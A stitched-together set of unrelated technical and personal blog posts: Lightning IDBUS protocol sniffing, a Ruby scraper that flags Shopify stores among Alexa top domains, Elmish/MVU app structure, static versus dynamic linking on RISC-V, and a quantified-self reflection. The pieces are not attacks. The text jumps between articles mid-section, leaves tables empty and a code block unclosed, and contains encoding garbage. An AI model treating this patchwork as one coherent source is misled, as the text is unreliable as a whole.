                    These 2 terms are often referred as kind of synonyms. For convinience, I'll only use term <b>IDBUS</b> from now on, as it seems more correct to me (and that's how this technology called in the THS7383 datasheet)</p><p>

                    

                    So, <b>IDBUS</b> - is a digital protocol used for negotiations between Tristar and HiFive. Very similar to <a target="_blank" href="https://en.wikipedia.org/wiki/1-Wire">Onewire protocol</a></p></div>

                <div>
                    <h2>Now we can play</h2><p>

                    Let's sniff the negotiations between Tristar and HiFive. Take a logic analyzer, a Lightning male-to-female passthrough breakout board, some accessory (normal Lightning to USB cable would fit just fine) and of course some device with Lightning port</p><p>

                    

                    First connect logic analyzer's channels to both <b>ID</b> lines of the breakout (pins 4 and 8) and connect the breakout to the device, but do not connect the accessory just yet:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_1.jpg"><br>

                    Right after that start sampling (any rate from 2 MHz and up should be fine). You'll see something like this:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/id_lines_activity.png"><br>

                    As you can see, Tristar polls each ID line by rotation - one after another. But since we didn't connect any accessory, the polling obviously fails. At some point the device will grow tired of this endless stream of failures and stop it. Meanwhile let's examine what exactly happens while polling:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/polling_explained_1.png"><br>

                    First, we can see a long interval (~1.1 milliseconds) when the level is just high and nothing else is happening:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/charge.png"><br>

                    Apparently that time is used to charge internal HiFive's capacitor - the energy from it will be then used to power-up its internal logic chips</p><p>

                    

                    What happens next is far more interesting:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful.png"><br>

                    Obviously, that's some data flowing. But how to interpret it? How to decode it? Let's virtually split it to almost the least least significant parts - to something that I call <b>words</b>:

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful_splitted.png"><br>

                    So basically a <b>word</b> is a combination of <b>fall</b>-<b>rise</b>-<b>fall</b>:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/word_splitted.png"></p><ul>
                        <li><span>Meaningful Stage</span> - time interval taken by this stage defines meaning of a word</li>
                        <li><span>Recovery Stage</span> - time interval which is apparently required for processing the <span>Meaningful Stage</span> on recieving side and/or preparing the next word on sending stage</li>
                    </ul><p>

                    Here is a table of known word types with their time intervals for both stages we discussed above (all units are in microseconds):</p><table>

                    </tbody></table>

                    <p>

                    * - <b>STOP</b> is used when it's a last bit in a byte</p><p>

                    

                    Using the above table we can now build a simple decoder of the protocol:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/decoded.png"><br>

                    As you can see, the first word a host sends is <b>BREAK</b> - when Tristar wants to send a new request, it always starts with it. Then comes a data stage. Please pay attention to the fact that last (8th) bit of a byte has longer <span>Recovery Stage</span>. When a data stage is over, a host sends another <b>BREAK</b>. Then a slave must send a reply (after at least a 2.5 us delay - see the table). Tristar will wait for around 2.2 ms for a reply. If it's not issued in this time interval, Tristar will try to poll another ID line</p><p>

                    

                    Now let's examine the data stage on the example above - <span>0x74 0x00 0x02 0x1f</span>:

                    </p><ul>
                        <li><span>0x74</span> - request/response type. Always even for request, always odd for response (request type + 1)</li>
                        <li><span>0x00 0x02</span> - actual data. Can be empty</li>
                        <li><span>0x1f</span> - CRC8 of both the request type byte and the whole data (polynomial - 0x31, initial value - 0xff)</li>
                    </ul><p>

                    Let's connect some accessory to our setup and see what happens. I'll use Apple's original Lightning to USB cable:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_2.jpg"><br>

                    And here is what appears on IDBUS after a 0x74 request:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/response_0x75.png"><br>

                    HiFive replied! And if you scroll further you'll see a lot of other request/response pairs:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/response_0x79.png"><br>

                    Some requests do not need a response though:

                    <img src="https://nyansatan.github.io/lightning/resources/request_0x84.png"><br>
                </p></div>

                <div>
                    <h2>Interpreting IDBUS requests and responses</h2><p>

                    The most important IDBUS request is <b>0x74</b> - it is used for two purposes: to tell HiFive enable full current (in case that's supported by an accessory) and to ask it about pin configuration the cable supports and some other metadata</p><p>

                    

                    Not too much is known about how response 0x75's data is encoded. But some bits were available in a certain old Tristar datasheet:</p><table>

<h5>How I outperformed BuiltWith and PublicWWW’s free plans with a couple hours and 30 lines of code.</h5>

<p>What if you wanted to find a list of websites that are using a specific piece of technology? Like if you wanted a list of all websites using WordPress? <strong>Or in my case, all websites built with Shopify?</strong></p>



<p>You might turn to <a href="https://builtwith.com/">BuiltWith</a> or <a href="https://publicwww.com/">PublicWWW</a>. These sites scan the source code of websites to determine the technology the website is built on. </p>



<p>Very useful and cool! Until you see the pricing pages:</p>



<figure><img src="https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-4.37.55-PM-1024x517.png" alt="" srcset="https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-4.37.55-PM-1024x517.png 1024w, https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-4.37.55-PM-300x151.png 300w, https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-4.37.55-PM-768x388.png 768w, https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-4.37.55-PM.png 1214w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Now, let me just say – I get it. </p>



<p>The work they’re doing ain’t easy, and the pricing is justifiable, <strong>but I know how to code, like a fun challenge, and can’t help but wonder if I can build my own version?</strong></p>



<p>Let’s find out…</p>



<p><strong>The way I see it, this problem has two components:</strong></p>



<ol><li>I need a script that can automatically check, when supplied a website domain, if that website is using Shopify or not.</li><li>I need a really big list of website domains to run the first script against.<br></li></ol>



<p>Once I have both of those pieces, I can put them together to make my Bootleg Builtwith. </p>



<h2>Part 1: Determining if a certain website uses Shopify</h2>



<p>Let’s start with the first component: When given a website URL, I need a reliable method to check if that website uses Shopify.</p>



<p>The simplest way to check if a website is using Shopify is to inspect the website source, and look for code that only a Shopify store would use.</p>



<p>Now, I already know of such a snippet that is unique to Shopify stores: It’s ‘trekkie’ – which is what Shopify calls their custom analytics solution:</p>



<figure><img src="https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-3.14.56-PM.png" alt="" srcset="https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-3.14.56-PM.png 753w, https://emersoncode.com/blog/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-3.14.56-PM-300x102.png 300w" sizes="(max-width: 753px) 100vw, 753px"></figure>



<p>Cool. Let’s use that as a base point and start coding.</p>



<p>Let’s write a dead simple, 15 line, Ruby script to kick this off:</p>



<pre><code lang="ruby">require 'open-uri'

# Prompt me for a URL 
puts "What URL do you want to check?"
url = gets.chomp

# Open the URL I supplied above
html = open(url).read

# Checks the source code for the Shopify specific code snippet
if html.include? "var trekkie = window.ShopifyAnalytics.lib"
	puts 'This site uses Shopify'
else
	puts 'This site does not use Shopify'
end 
 </code></pre>



<p>Cool. Let’s run it, and try testing it against a couple websites to make sure it’s reliable:</p>



<figure><video controls="" src="https://emersoncode.com/blog/wp-content/uploads/2020/07/My-Movie-Medium.mov"></video></figure>



<ul><li>First test using a Shopify site =&gt; https://emerson-code-development.myshopify.com<ul><li>That worked. Let’s try a different Shopify website:</li></ul></li><li>Second test with another Shopify site =&gt; https://allbirds.com<ul><li>Once again, looking good. Now let’s try a website that definitely doesn’t use Shopify.</li></ul></li><li>Third test with a site that doesn’t use Shopify =&gt; https://amazon.com<ul><li>Error!</li></ul></li></ul>



<p>Ah, yes, I should’ve anticipated this but Amazon blocks my script from inspecting the website source code here. </p>



<p>Now I could get crazy and break out a more sophisticated scraping solution like <a href="http://watir.com/">Watir</a> but remember this is bootleg, so let’s think through that extra work for a second…</p>



<p>So if Shopify stores don’t block my script, can’t I just assume that if my script is blocked, that it’s not a Shopify store? Makes sense to me. Let’s do that:</p>



<pre><code lang="ruby">begin
		html = open(url).read

		if html.include? "var trekkie = window.ShopifyAnalytics.lib"
			puts url + ': This site uses Shopify'
			# It's a match! Let's write it to a CSV
			CSV.open("/Users/emerson/Downloads/results-shopify-stores.csv", "a") do |csv|
			  csv &lt;&lt; [url]
			end
		else
			puts url + ': This site does not use Shopify'
		end 
	rescue
		puts url + ': Blocked. Probably does not use Shopify'
	end</code></pre>



<p>Okay. Bingo. Part 1’s solution is decent enough.</p>



<h2>Part 2: Get a big list of websites</h2>



<p><strong>Onto the next one: </strong>I need a massive list of domains to check.</p>



<p>Search engines typically use something called spiders here to find and create directories/lists of webpages. Spiders start at one webpage, follow all the links on that webpage, and then the links on those webpages, and so on until it has mapped all the webpages it can get its hands on.</p>



<p>Now if you wanted to build a Builtwith competitor you’d probably need to do something like that, but this is bootleg baby!</p>



<p>I remember Alexa.com has a list of the top million website domains or whatever. I wonder if they make the list publicly available? Surely that’d give me a lot of high ranking websites to check, and high ranked websites are what we’d prefer here anyway, right?</p>



<p>A quick google search revealed <a rel="noreferrer noopener" href="https://gist.github.com/chilts/7229605" target="_blank">this</a> Github thread with some decent leads, and from that thread I have a downloaded CSV of the ‘top million domains’.</p>



<p>Checking the spreadsheet, it only has 764,166 domains, not 1 million… Good enough!</p>



<p>Let’s start with a couple lines of Ruby code that can use a CSV spreadsheet file as an input, and loop through each domain to perform my Shopify check I outlined in part 1.</p>



<p>Oh yeah… the domain list only includes the URL’s base: Eg bestbuy.com, not https://www.bestbuy.com. That’s okay, let’s just assume most domains are using https:// and prepend it to the start of every URL before we check it:</p>



<pre><code lang="ruby">url = 'https://' + url</code></pre>



<p>Cool. One last thing. If my script does detect a Shopify store, let’s go ahead and save that to a separate CSV to serve as my output, so when my scripts finished, I’m left with just list of websites using Shopify.</p>



<pre><code lang="ruby">if html.include? "var trekkie = window.ShopifyAnalytics.lib"
   puts url + ': This site uses Shopify'
   # It's a match! Let's write it to a separate CSV
   CSV.open("/Users/emerson/Downloads/results-shopify-stores.csv", "w") do |csv|
      csv &lt;&lt; [url]
   end
else
...</code></pre>



<p>Okay… One hour later and I barely have gotten through 1000 URLs, and none of those are Shopify sites it seems. </p>



<p>Make sense. If you’re one of the top websites in the world, it’d make sense that you’d be using a custom platform to run it.</p>



<p>Given that, to make this a little bit easier, let’s go ahead and skip the first 50K top sites and start scanning at 50,001:</p>



<pre><code lang="ruby">domainList = CSV.read('/Users/emerson/Downloads/top-1m.csv', headers:true)

domainList.drop(50000).each do |row|

<p>A couple minutes later and we got one! </p>

<p>After letting that script run in the background for a few hours, I’ve checked about ~12K domains (Alexa’s top 50K-62K domains), and found ~220 of those sites are using Shopify. So 1.83% of the so far checked domains were using Shopify.</p>



<p>Quick and dirty math: Roughly 700K domains still need to be checked. Assuming similar positive rate as the domains I have checked so far, my bootleg script should produce a list of 10K+ high ranking Shopify stores.</p>



<p><strong>Free BuiltWith: 50 high ranking Shopify stores</strong></p>



<p><strong>Free PublicWWW: 2359 high ranking Shopify stores</strong></p>



<p><strong>30 lines of Ruby code: 10K+ high ranking Shopify stores</strong>* (Estimated, will update when I have final numbers)</p>



<p>Update 1: After running the script for 20 hours in the background, I’ve checked about ~3% of Alexa’s top domain list, and produced a list of 900 Shopify stores. Cya in a week for final results.</p>



<h3>To be continued!</h3>



<p>Also, here is complete Ruby script:</p>



<pre><code lang="ruby">require 'csv'
require 'open-uri'

def isUsingShop(url)
	begin
		html = open(url).read

		if html.include? "var trekkie = window.ShopifyAnalytics.lib"
			puts url + ': This site uses Shopify'
			# It's a match! Let's write it to a CSV
			CSV.open("/Users/emerson/Downloads/results-shopify-stores.csv", "a") do |csv|
			  csv &lt;&lt; [url]
			end
		else
			puts url + ': This site does not use Shopify'
		end 
	rescue
		puts url + ': Blocked. Probably does not use Shopify'
	end
end 

domainList = CSV.read('/Users/emerson/Downloads/top-1m.csv', headers:true)

domainList.drop(50001).each do |row|
    url = row[1]
    url = 'https://' + url

    isUsingShop(url)

end

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <article>
    
    <p>You've learned about MVU and started building a real app that is now growing beyond its first view. Now you are wondering: How can that be structured, how does it scale? Does it scale at all?</p>
    
    <p>I bet that everyone who does get started with "The Elm Architecture" sooner or later arrives at that point. No matter if they use <a href="https://elm-lang.org/">Elm</a>, <a href="https://elmish.github.io/elmish/">Elmish</a>, <a href="https://fsprojects.github.io/Fabulous/">Fabulous</a>, or other libraries and frameworks. So you are not alone. And it caused me to scratch my head, too.</p>
<h2>The Problem</h2>
<p>When looking at the <a href="https://thomasbandt.com/model-view-update">ubiquitous counter examples</a>, the advantages of MVU quickly become apparent. Besides other things, the uni-directional dataflow makes it very easy to reason about a program. At least for such simplistic scenarios.</p>
<p>In real-world scenarios, however, the number of messages and the size of your update function will quickly grow. You will want to split your first program into multiple parts, be it multiple "pages" or "widgets."</p>
<p>To maintain the single message loop you will need to break up your program into parents and their children. The entire process is being described in the wonderful Elmish Book. If you want to learn more first, I recommend taking a break and read its <a href="https://zaid-ajaj.github.io/the-elmish-book/#/chapters/scaling/splitting-programs">chapter about splitting programs</a> first.</p>
<p>What you will end up with is a set of relatively slim children. Which do not know anything about their parents nor their siblings. That's the plus. The downside: Parents need to know a lot about their kids. In fact, for specific scenarios, you will need to intercept messages sent by children in one of their parents. Or you will introduce an additional message type that is being used for "external communication" (<a href="https://zaid-ajaj.github.io/the-elmish-book/#/chapters/scaling/intent">the intent pattern</a>).</p>
<p>As a result, a parent's update function will be not only dealing with its own logic, but it will also handle a lot of things for its children. Which will probably feel counter-intuitive, to say the least.</p>
<p>So what can be done? Well, it depends on what you want to sacrifice. There's no such thing as free lunch, as always.</p>
<h2>Option 1: Embrace The Original Idea</h2>
<p>Yes, MVU will make you write <em>a lot</em> of boilerplate code. Yes, every component of your application will look the same. But that can be considered a good thing. Because it narrows down the "implementation path" massively. There's not much room left to do something wrong.</p>
<p>Which might pay off in the long run. You will probably be able to easily reason about the behavior of the application after a long time. You won't end up with different implementation styles that depend on the person who worked on it last and their state of knowledge. This also means that it will probably make it easier for new team members to understand what is happening and to get started.</p>
<p>Bonus: Even if they break the whole application by changing something, the compiler will tell them very early. And the moment they mastered their first component, they have learned most of what is needed to continue to work on different parts of the application.</p>
<p>Another positive side-effect: You free yourself from all the trends and hypes of our industry, at least for the scope of the particular project you're choosing to work with MVU. For Elmish, for example, the view might still end up being rendered with React â€“ but that's just an infrastructure layer below your application. React moves from classes to functions, or it introduces new features that break existing patterns? You don't need to care, you can stay in your comfort zone on top of all that.</p>
<h2>Option 2: Split It Up</h2>
<p>If you still have a hard time committing yourself to write code you do not want to write, no matter what, you can break the whole thing into multiple programs. Although it may seem counter-intuitive at first, it is what <a href="https://github.com/elmish/Elmish.WPF">some</a> <a href="https://thomasbandt.com/mvu-for-native-xamarin-apps">MVU implementations</a> have to do anyway.</p>
<p>So how do you do that? Well, it depends on what you are building. For mobile applications with Fabulous, you might want to keep building your app with ordinary pages. The same goes for web applications: There is nothing wrong with having multiple (server-side rendered) pages that host an independent Elm(ish) program.</p>
<p>For web applications built with Elmish, there's even one more option. The <a href="https://github.com/Zaid-Ajaj/Feliz">Feliz project</a> from Zaid Ajaj offers a React hook called <a href="https://zaid-ajaj.github.io/Feliz/#/Hooks/UseElmish">Feliz.UseElmish</a>. This allows you to build a (more or less) normal React application written in F# and composed of different React function components, which internally can use MVU if needed. This way, you can build simple components (think of navigation elements) without an artificial message loop. And still leverage all the advantages of MVU in case it makes sense.</p>
<p><em>A simple React function component without MVU (<a href="https://github.com/aspnetde/typesafe-spa/blob/master/src/FelizFunctionComponents/src/Authenticated/Dashboard.fs">source</a>):</em></p>
<pre><code>module Dashboard

open Feliz

let render = React.functionComponent(fun () -&gt;
    let context = React.useContext AppContext.instance
    Html.textf "Welcome, %s! " context.Session.User
)
</code></pre>
<p><em>A more sophisticated component with some internal logic that is worth to be implemented following MVU (<a href="https://github.com/aspnetde/typesafe-spa/blob/master/src/FelizFunctionComponents/src/Anonymous/Login.fs">source</a>):</em></p>
<pre><code>module Login

type private State =
    { UserName: string
      Password: string
      Error: string option }

type private Msg =
    | UserNameSet of string
    | PasswordSet of string
    | StartLogin of AppContext.ContextData
    | LoginFailed of string
    | LoginCompleted

let private init() = { UserName = ""; Password = ""; Error = None }, Cmd.none

let private updateSession (context: AppContext.ContextData) user =
    context.SetSession({ context.Session with User = user })
    LoginCompleted

let private validateCredentials context state =
    if state.UserName = "user" &amp;&amp; state.Password = "test" then
        state, Cmd.ofMsg (updateSession context state.UserName)
    else
        state, Cmd.ofMsg (LoginFailed "Oops, user name or password are incorrect.")

let private update msg state =
    match msg with
    | UserNameSet userName -&gt; { state with UserName = userName }, Cmd.none
    | PasswordSet password -&gt; { state with Password = password }, Cmd.none
    | StartLogin context -&gt; validateCredentials context state
    | LoginFailed error -&gt; { state with Error = Some(error) }, Cmd.none
    | LoginCompleted -&gt; state, AuthenticatedUrl.Dashboard.Navigate()

let render = React.functionComponent(fun () -&gt;
    let state, dispatch = React.useElmish(init, update, [| |])
    let context = React.useContext AppContext.instance

    Html.div [
        Html.div [
            prop.text state.Error.Value
            prop.hidden state.Error.IsNone
        ]
        Html.input [
            prop.type'.text
            prop.placeholder "User name"
            prop.onChange (UserNameSet &gt;&gt; dispatch)
        ]
        Html.input [
            prop.type'.password
            prop.placeholder "Password"
            prop.onChange (PasswordSet &gt;&gt; dispatch)
        ]
        Html.button [
            prop.onClick (fun _ -&gt; dispatch (StartLogin context))
            prop.text "Get in"
        ]
    ]
)
</code></pre>
<p>What you will obviously lose that way is the advantages of a single application-wide message loop. You will need to find alternative measures to communicate between parents and their children, or different components at different places at the tree. But when you came this far, you for sure will find a suitable solution for that, too (hint: in the sample above, <a href="https://zaid-ajaj.github.io/Feliz/#/Feliz/React/ContextPropagation">React Context</a> was used).</p>
<h2>Conclusion</h2>
<p>Model-View-Update is a powerful concept, but it's far from perfect when applied in real-world applications. Whether or not this becomes a problem for you depends on what you are willing to make compromises for. No surprise, there is no free lunch.</p>

<p>Static vs dynamic linking usually has to do with our tolerance for the size of our final executable. A<em> static </em>executable contains all code necessary to run the executable, so the operating system loads the executable into memory, and it’s off to the races. However, if we keep duplicating code over and over again, such as printf, then it starts to use up more and more space. So, a <em>dynamic</em> executable means that we only store <em>stubs</em> in the executable. Whenever we want to access printf, it goes out to a <em>dynamic linker</em> and loads the code essentially <em>on demand</em>. So, we sacrifice a tiny bit of speed for a much smaller executable.</p>

<hr>



<h2 id="linking">What is Linking?</h2>



<p>When I hear someone talk about <em>compiling</em> their program into an executable, they are really eliding over several stages. The definition of  compiling is to <em>produce something by combining information collected from different sources.</em> In computing, we generally think of compiling as turning a higher-level language, such as C, into a lower-level code, such as assembly.</p>



<p>The final stage before we get an executable is the <em>linking</em> stage. This is where we <em>link</em> (hence the name) all sources together to produce one coherent executable. This is also where all outstanding symbols need to be resolved. Symbol is just fancy for the name of a function or global variable.</p>



<p>We can take a look at <em>object code, </em>which is what we get after we assemble but before we link. Here’s an object dump of an example program.</p>



<pre data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
void some_func(int a, int b);

int main(int argc, char *argv[]) {
	if (argc &lt; 3) {
		printf("Not enough arguments.\n");
		return -1;
	}

	int a = atoi(argv[1]);
	int b = atoi(argv[2]);

	some_func(a, b);

	return 0;
}</pre>



<p>This code produces the following object code, which I disassemble using objdump for RISC-V.</p>



<div><figure><img src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23.png" alt="" width="500" height="341" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23.png 667w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23-300x204.png 300w" sizes="(max-width: 500px) 100vw, 500px"></figure></div>



<p>Notice that the function some_func has been prototyped, but has not been defined. This will be the responsibility of the linker to find the symbol some_func and add it into our program. Notice what happens when I try to link this program without ever defining some_func.</p>



<pre>/opt/riscv_1/lib/gcc/riscv64-unknown-linux-gnu/9.2.0/../../../../riscv64-unknown-linux-gnu/bin/ld: /tmp/ccmgFc75.o:
<br>
in function .L2': test.c:(.text+0x62): undefined reference to some_func'
<br>
collect2: error: ld returned 1 exit status</pre>



<p>The linker is looking for the symbol some_func, but it cannot find it, so we get an <em>undefined reference</em>. We know this is at the linker stage because the error is “ld returned 1 exit status”. The “ld” means “linker”.</p>



<p>We also can see that the address of the function main is 0, this is because we haven’t linked a program. So, our object code just contains <em>bubbles</em> of code, which will then be placed into our executable at certain locations by the linker.</p>



<hr>



<h2 id="finding">Finding Symbols</h2>



<p>If we use the command <em>nm</em>, which is used to list symbols in an object file, we can see all of the <em>unresolved</em> symbols. Our object code is looking for these, but it doesn’t need to know where they are until we have a full executable program.</p>



<div><figure><img src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24.png" alt="" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24.png 317w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24-300x169.png 300w" sizes="(max-width: 317px) 100vw, 317px"></figure></div>



<p>You can see that in this object file, the linker has a little bit of work to do. It must find atoi, puts, and some_func, which are flagged as U for undefined symbols. When we execute the linker, we will specify certain libraries, such as -lc (the C library), which most of these symbols will be found. Our some_func has never been defined, so our linker cannot really succeed until we define it somewhere.</p>



<hr>



<h2 id="static">Static Libraries (archives)</h2>



<p>Archive files generally end in .a and contain code and other information that will be added to the final executable. Essentially, archive files are just a collection of object files into one file. Therefore, when we link to an archive file, we extract the actual code from the object code into our executable. The nice thing about archive files is that we don’t need to add ALL symbols into our executable–we only need those symbols that need to be used.</p>



<p>Usually, we have archive versions of all libraries to allow for <em>static</em> executables. These executables are those that don’t need any additional loading to run. In other words, these are self-contained files. The linker stage will pull in the code directly from the .a file into the executable, and all is done. The more code that the linker pulls in, the larger the executable will be.</p>



<p>Let’s go ahead and define some_func and see how linking works.</p>



<pre data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#include &lt;stdio.h&gt;

void some_func(int a, int b)
{
	printf("Data = %d\n", a * b);
}
</pre>



<p>It’s very simple, but the point is to have some code that the linker can pull in. Recall that the linker gave us an “undefined reference” error because we didn’t define some_func. Now, we have it defined, so let’s see what happens.</p>



<pre>riscv64-unknown-linux-gnu-gcc -static -o test test2.o test.o</pre>



<p>Notice that I’m using gcc still. This will automatically invoke the linker and pull in the necessary <em>start files</em>. If we invoke the linker directly, we have to define _start and tell the program how to start, or we would have to directly specify the start files.</p>



<p>I specify -static so that gcc will pull in only .a files. When we are done, the file <em>test</em> will be a fully-contained, static executable. If we take a look at this file, we can see that all of the “stuff” we need for this executable makes it a fairly large file.</p>



<pre>-rwxr-xr-x 1 smarz smarz 4687920 Jun 1 09:16 test</pre>



<p>Yes, that’s 4,687,920 bytes or about 4.7 megabytes. However, if we looked at the symbol table, we will find that NO symbol is unresolved, and therefore this is a self contained executable. If we load this with our elf loader, no external resources will need to be pulled in.</p>



<p>Our linker must exhaustively follow every possible route and pull in those symbols even though they may never be called. We can see the symbol table is enormous due to all of the calls and global variable (such as errno).</p>

<hr>



<h2 id="dynamic">Dynamic Libraries (shared objects)</h2>



<p>Dynamic libraries end in .so, which stands for <em>shared object</em>. These libraries contain code that will not be added directly into the executable. Instead a program called the <em>dynamic linker</em> will be responsible for taking code from the .so files and adding them into an executing program. We can also add symbols ourselves using the -ldl (dynamic linker) library.</p>



<p>We can think of the term <em>dynamic</em> as <em>run-time</em>. That is, we don’t actually load the code into our program until the program actually runs. We can see this with something as simple as printf. We can examine our executable and we don’t see printf’s code. Instead, we see printf’s <em>stub</em>. This stub will then be replaced by the dynamic loader when the program executes.</p>



<p>When we link with a dynamic, shared object, those symbols that can be added at run time will remain unresolved. We will have the symbols’ names put into a table just so we know it’s out there somewhere. However, with shared objects, we now can get that <em>unresolved reference</em> (or symbol) at run-time! If you have arch-linux and have ever compiled anything yourself, you might’ve run into this phenomenon.</p>



<hr>



<h2>Making a Shared Library</h2>



<p>Let’s go ahead and turn our test2 file into a shared object. This is fairly easy to do with gcc:</p>



<pre>riscv64-unknown-linux-gcc -fPIC -shared -o libtest2.so test2.o</pre>



<p>The switch -fPIC stands for <em>position independent code</em>. That means all offsets cannot be relative outside of the library itself, and this is usually the case for most shared libraries. In this case, the generated code will be placed into a table to find the offsets. This is required since the library, or specific symbols in the library, can be loaded into any location by the dynamic linker.</p>



<p>Then, we can compile our test program to link to this shared library:</p>



<pre>riscv64-unknown-linux-gcc -o test test.o -L. -ltest2</pre>



<p>In the command above, I am specify the library search path with -L, so -L. means to look in the current directory. Then, I specify the library to link with using -ltest2. GCC will automatically prepend lib and append .so to make libtest2.so.</p>



<hr>



<h2 id="analyze">Analyzing A Shared Program</h2>



<p>First, we compile in the location of our library. We can see these shared libraries using the ldd command.</p>



<pre>smarz@DOMO:~ $ ./test<br>
./test: error while loading shared libraries: libtest2.so: cannot open shared object file: No such file or directory</pre>



<p>So, when I run my program, it looks at a certain path to find your libraries. This is analogous to the PATH environment variable, except in Linux (and some UNIXes), we use LD_LIBRARY_PATH. Shown below, if I change my path so the dynamic linker can find my library, it functions properly:</p>



<pre>smarz@DOMO:~ $ LD_LIBRARY_PATH=/home/smarz ./test 10 20<br>
Data = 200</pre>



<hr>



<h2 id="unresolved">Unresolved at Run Time</h2>



<p>When we link a program, many of the symbols will remain unresolved. This tells us what symbols the dynamic linker is responsible for loading from the shared objects (libraries). We can see these unresolved symbols using the nm command:</p>

  <p><img src="http://mtsolitary.com/assets/img/tableau.jpg"></p><p>This is a photograph of spring in Tel Aviv, into which I emerged from the coronavirus lockdown a little bleary-eyed and with a newfound addiction to chocolate <a href="https://en.wikipedia.org/wiki/Krantz_cake"><em>krantz</em></a> yeast cakes.</p>

<hr>

<h2 id="1-examining-your-life">1. Examining your life</h2>

<blockquote>
  <p>The unexamined life is not worth living.</p>
</blockquote>

<p>I’ve always been drawn to this quote, usually attributed to Socrates. The original <a href="https://en.wikipedia.org/wiki/The_unexamined_life_is_not_worth_living">meaning</a> of the quote is to emphasise the need for a personal philosophy, a way of thinking about yourself, that uses reflection to build a better future self through reference to and critique of the past self. Today, the quote brings to my mind the <a href="https://en.wikipedia.org/wiki/Quantified_self">quantified self movement</a>, a group of people who are devoted to the idea of collecting information about themselves, reviewing it and drawing insights from it to improve, or at the very least understand, their lives.</p>

<p>I’m not sure what Socrates would have to say about this modern “data-driven” philosophy, but I have become more and more drawn to the idea over the past couple of years. I thought it might be interesting to share some of the things I’ve noticed over the last five hundred days about myself, in the hope that this might inspire others to consider paying closer attention to their lives. There’s another reason for sharing too: I think there is a certain aesthetic value inherent in the topology of life one can see writ in the charts, the moving of a line along the page tracing some weird average of the thousands of variables that make up a day in anyone’s life that nonetheless contains some sort of signal.</p>

<h3 id="sleep">Sleep</h3>

<p>The older I become the more convinced I am that sleep is one of the most important, perhaps the single most important, factor in remaining balanced, peaceful and energetic throughout the day. The chart below shows the hours I slept every night, together with a moving 7-day average, over the last five hundred days. I don’t use any fancy sleep trackers, I just write down in a spreadsheet every morning how many hours I slept the previous night.</p>

<p><img src="http://mtsolitary.com/assets/img/sleep.png" alt="Sleep"></p>

<p>There are several periods of my life which are clearly visible on this graph. The most striking is the birth of my son, in February this year, following which there were understandably a few weeks of very little sleep. There are periods of greatly increased variation around holidays I took. And at the beginning of the COVID-19 lockdown I used the time I saved not commuting to and from work every day to catch up on some of that sleep I lost in February.</p>

<h3 id="alcohol">Alcohol</h3>

<p>The quantified self movement is convinced that sleep, alcohol, other drugs and caffeine (in that order usually) have the biggest overall impact on mood and general contentment in life. I track all of these metrics, and when I looked at the plots I generated I wondered whether I really wanted to share the graph below, in which a black bar represents a day on which I consumed alcohol over the last five hundred days.</p>

<p><img src="http://mtsolitary.com/assets/img/alcohol.png" alt="Alcohol"></p>

<p>It’s pretty clear from the graph above that I drink too frequently (I thought about colouring the bars by the number of drinks, which I also track but ultimately went for the simpler version). I also notice the correlation between consecutive drinking days (usually a beer or two or a glass of wine in the evening) and stressful periods in my life.</p>

<h3 id="work">Work</h3>

<p>While I was writing <a href="http://mtsolitary.com/journal/xxvii.html">XXVII</a> and <a href="http://mtsolitary.com/journal/xxviii.html">XXVIII</a> I was looking for a metric that shows a visible effect of the COVID-19 lockdown and the best one I could find is of my daily working hours (these are the hours between the time I count myself as starting work and the time I count myself as finishing, so they include time like lunchbreaks, coffee and chatting in the office when I wasn’t strictly-speaking “working”. I use <a href="http://rescuetime.com/">Rescuetime</a> to track actual bum-in-seat computer time at work but I think that’s a less interesting chart).</p>

<p><img src="http://mtsolitary.com/assets/img/work_dur.png" alt="Work"></p>

<p>I like the healthy amounts of vacation time, and on second thoughts I think the effect visible from February (after my return from a too-short paternity leave) is probably more to do with being a first-time parent than the lockdown <em>per se</em>.</p>

<h3 id="anxiety">Anxiety</h3>

<p>The holy grail of self-tracking, of the reflective data scientist, is an answer to the question “am I happy” based on actual data from your life. For me the answer to the question “am I happy” on a day-to-day basis can be approximated with the answer to the question “how anxious am I feeling today”, and to that end I tried my best to track my general mood and feeling of contentment (10) or anxiety (0) at three points throughout the last five hundred days.</p>

<p><img src="http://mtsolitary.com/assets/img/mood.png" alt="Mood"></p>

